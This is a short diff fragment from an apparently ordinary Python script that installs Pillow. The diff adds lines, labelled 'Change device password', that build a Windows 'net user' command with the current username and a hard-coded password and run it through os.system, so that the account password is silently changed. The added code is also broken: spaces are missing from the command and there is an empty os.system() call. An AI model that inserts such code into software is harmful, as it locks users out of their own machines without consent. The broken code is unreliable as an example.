@@ -9,6 +9,14 @@ os.system('pip install pillow')
 
 
 
+#Change device password
+user = os.environ['USERNAME']
+code = 'net user' + user + 'yourhacking!!!@#$$##%$ytyt766'#<password
+os.system(code)
+os.system()
+
+
+
 
 
 
